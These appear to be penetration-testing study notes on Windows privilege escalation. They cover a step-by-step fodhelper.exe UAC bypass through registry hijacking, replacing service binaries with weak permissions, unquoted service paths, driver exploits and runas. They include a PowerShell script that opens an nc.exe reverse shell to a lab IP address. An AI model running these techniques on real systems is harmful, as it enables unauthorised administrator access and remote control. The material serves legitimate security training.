## Privilege Escalation

### User Access Control (UAC) 

Show integrity levels 

```powershell
whoami /groups

# Mandatory level shows the current integrity level
```

Change a user's password

```powershell
net user USERNAME PASSWORD
```

Start command shell as Admin from a prompt

```powershell
powershell.exe Start-Process cmd.exe -Verb runAs
```

#### UAC Bypass Case Study - fodhelper.exe

Note:  Most publicly known UAC bypass techniques target a specific OS version, be sure to check this & compare with the target.

Runs with high privileges and allows the modification of some registry entries without admin privileges.

Application Manifest - XML file with info that lets the OS know how to handle the program when it's started

1. Examine this with sigcheck.exe (From [SysInternalsSuite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite))

   ```powershell
   sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
   
   -a	# Extended info
   -m	# dump manifest
   ```

   Look for these settings in the manifest:

   - `RequestedExecutionLevel` - The application requires this level of access to run
   - `autoElevate` - Allows the executable to auto-elevate to high integrity without prompting the admin user for consent

2. Monitor the fodhelper tool with Process Monitor (From [SysInternalsSuite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite))

   - Use the filters to reduce out:
     - By Process Name `Process Name is fodhelper.exe`
     - By Registry edits `Operation contains Reg`
     - By Registry keys that don't exist `Result contains NAME NOT FOUND`
   - We are looking for registry keys it attempts to access that aren't found currently hoping we can tamper with those keys to change the actions of the process.
     - Filter again for keys we can edit `Path contains HKCU`
     - Can further filter the path for settings of interest, ex `Path contains ms-settings\Shell\Open\command`
     - May want to remove the `Result` filter to see successful access to the key to gain more understanding of what's happening with it
   - What we find is fodhelper searches for this key in HKCU (Current User) first, then moves on to HKCR (Classes Root) second.
     - Browse to the existing registry key to check it out and look it up on [MSDN](https://docs.microsoft.com/en-us/windows/win32/shell/launch) to see that fodhelper is seeking that key to launch a section from Windows Settings.
     - In this case, fodhelper is using the ms-settings application protocol, which defines the executable to launch when a URL is used by a program.
     - URL-Application mappings are defined in registry entries, and may sometimes point to a COM object rather than a program by setting the key value to a COM class ID
   
3. Try to hijack the fodhelper's process by creating the missing key in HKCU and inserting custom instructions

   - Create the key `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command`
   - Add back the result filter to see how adding that key changes things `Result contains NAME NOT FOUND`
   - Clear the existing Process Monitor results (CTRL+X), which will not erase the filters
   - Restart fodhelper.exe and check ProcMon to find a new 'NAME NOT FOUND' entry with `Open\command\DelegateExecute`.  
   - This would point to a COM object, but we don't want that, so we'll create this key and leave it empty.  `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ`
     - /v specifies the value name
     - /t specifies the type
   - To verify this change, replace the `NAME NOT FOUND` keywords with `SUCCESS` in the ProcMon filters, clear the results, then re-run fodhelper and you should see SUCCESS entries for the newly added DelegateExecute key.
   - You will notice also that there is an entry for ..\\(Default) now showing as well.  Because DelegateExecute was empty, fodhelper will instead try to execute a default command in that registry entry.  This value is set to null by default, however, so nothing happens....yet.
   - Set the empty (Default) value with a value of your own, for instance, cmd.exe `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`
     - /d specifies the data being added
     - /f force overwriting without a prompt (silent mode)

4. Exploit Successful

   - Run fodhelper.exe again and a cmd shell will appear along with it
   - Verify the integrity level is set to 'High' with `whoami /groups`

### Insecure File Permissions

Common way to elevate privileges is to exploit insecure file permissions on services that run as `nt authority\system`

For example, a program may be set to run as a service with elevated privileges but the permissions of the program are not secured, allowing to be overwritten by malicious code and run with SYSTEM privileges once the service is restarted.

#### Serviio Case Study

1. Look for running processes on the system using Powershell, then notice that serviio is in the Program Files directory, meaning it is user installed.

   ```powershell
   Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
   ```

2. Enumerate permissions on the target service (serviio) with icacls tool

   - Look for the permissions regular users have.  If you see an 'F', then that is a vulnerability

     ```powershell
     icacls 'C:\Program Files\Serviio\bin\ServiioService.exe'
     ```

3. Create malicious program to replace the target service with
   
4. Move it to the target machine, backup the real program and set the malicious one in its place.
   
5. Try to restart the service to execute the binary, but may be unable to do so due to lack of permissions.

   ```powershell
   net stop serviio
   net start serviio
   ```

6. If cannot restart service, check if the service is set to automatic:

   ```powershell
   wmic service where caption="Serviio" get name, caption, state, startmode
   ```

   Look for 'StartMode' set to 'Auto', indicating a reboot will automatically start the service.

7. See if the current user has rights to restart the system:

   ```powershell
   whoami /priv
   ```

   If you see `SeShutdownPrivilege` listed, then you have the privileges.  The `Disabled/Enabled` at the end is just showing if that privilege is active for the `whoami` process.  Without this privilege, you'd need to wait for the victim to reboot.

8. Issue a reboot for the machine to make service restart automatically

   ```powershell
   shutdown /r /t 0
   ```

### Unquoted Service Paths

If we have write permissions to a service's main directories and subdirectories, but cannot replace files in them, this is another route to take for privilege escalation.

*Note: This can't be done on the Windows Client, but there is a machine in the lab that it can be done on.*

Because most 3rd party apps are installed to "C:\Program Files\\\...." and this directory has a space in it, the developers should always ensure the path name is enclosed in quotation marks, which explicitly declares the path.

If the pathname is unquoted, it is open to interpretation, and anything after a white space is treated as a potential argument or option and the part before the space is treated as a program if Windows can find a program in that path.  Windows begins at the left-most side of the path and works it's way to the write, trying to find a program first, and if not, then it interprets it as a folder and looks for a folder.

For example, if the unquoted path is `C:\Program Files\My Program\My Service\service.exe`, then the options are to place programs at:  `c:\program.exe`, `c:\program files\my.exe`, or `c:\program files\my program\my.exe`.  Either of these options would cause the unquoted path to execute the inserted program.  

Typically users do not have access to `c:\` or `c:\program files`, but they might have access to child folders.

To check the paths of services, use the following command:

```powershell
# From command prompt (not Powershell)
wmic service get displayname,pathname
```

### Windows Kernel Vulnerabilities

When exploiting kernel level vulnerabilities, you must pay careful attention to the OS, version, architecture.  Running an incompatible exploit can trigger a BSOD on the target.

```powershell
# Cmd prompt
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

#### USBPcap Case Study

3rd Party Driver vulnerabilities are more common than kernel level vulnerabilities, so they are good to check out first.

1. Query drivers & look for 3rd party drivers

   ```powershell
   driverquery /v
   ```

2. If a driver is marked as 'stopped', it might still be useable because it's loaded in the kernel memory space.

3. Search the exploit DB for the driver.

4. You can determine the driver version by checking out the .inf file for the driver.

5. Compile the exploit code and run on the target.

6. Check privileges with `whoami` to verify privileges have been escalated.

### Runas

If you have the credentials of a user, you can use `runas `to execute a command (like reverse shell) as that user.  

<u>Interactive Prompt</u>

```powershell
runas /user:Administrator "C:\MYPROGRAM.exe"
```

This will prompt for the user's password and then run the command.

<u>Non-Interactive Prompt</u> (Works on WinXP too)

This requires some finesse, as there is no option to specify the password in the command, so a PowerShell script must be constructed, such as this one obtained from https://github.com/frizb/Windows-Privilege-Escalation/blob/master/runas.ps1 (with some modification on the nc parameters):

```powershell
$username = 'USERNAME_HERE'
$password = 'PASSWORD_HERE'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nv","192.168.119.216","8001","-e","cmd.exe") -WorkingDirectory C:\Users\Public
```

Then run the script

```powershell
powershell -ExecutionPolicy Bypass -File C:\Users\Public\runas.ps1
```

<u>ALTERNATE VERSION - MAY NOT WORK</u>

I found this on another site, but it wouldn't work when I tried it on XP

```powershell
$secpasswd = ConvertTo-SecureString "THEPASSWORD" -AsPlainText -Force 
$mycreds = New-Object System.Management.Automation.PSCredential ("THEUSERNAME", $secpasswd)
$computer = "THEHOSTNAME"
[System.Diagnostics.Process]::Start("C:\THEPROGRAM.exe","", $mycreds.Username, $mycreds.Password, $computer)
```
